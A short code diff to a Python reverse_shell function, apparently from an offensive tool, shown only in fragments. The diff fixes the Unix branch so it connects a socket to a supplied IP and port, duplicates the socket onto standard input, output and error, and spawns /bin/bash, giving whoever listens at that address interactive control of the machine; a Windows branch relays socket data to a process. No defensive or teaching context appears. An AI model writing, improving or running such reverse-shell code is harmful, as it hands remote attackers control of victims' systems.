@@ -3,7 +3,7 @@ def reverse_shell(ip, port):
     ip = ip
     port = port
     if(platform.system() == "Windows"):
-        import os,socket,subprocess,threading;
+        import socket,subprocess,threading;
         def s2p(s, p):
             while True:
                 data = s.recv(1024)
@@ -35,8 +35,8 @@ def reverse_shell(ip, port):
     else:
             import socket, subprocess, os, pty
             s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            s.connect((str(ip), str(port)))
+            s.connect((ip, int(port)))
             os.dup2(s.fileno(),0)
             os.dup2(s.fileno(),1)
             os.dup2(s.fileno(),2)
-            pty.spawn("sh")
+            pty.spawn("/bin/bash")
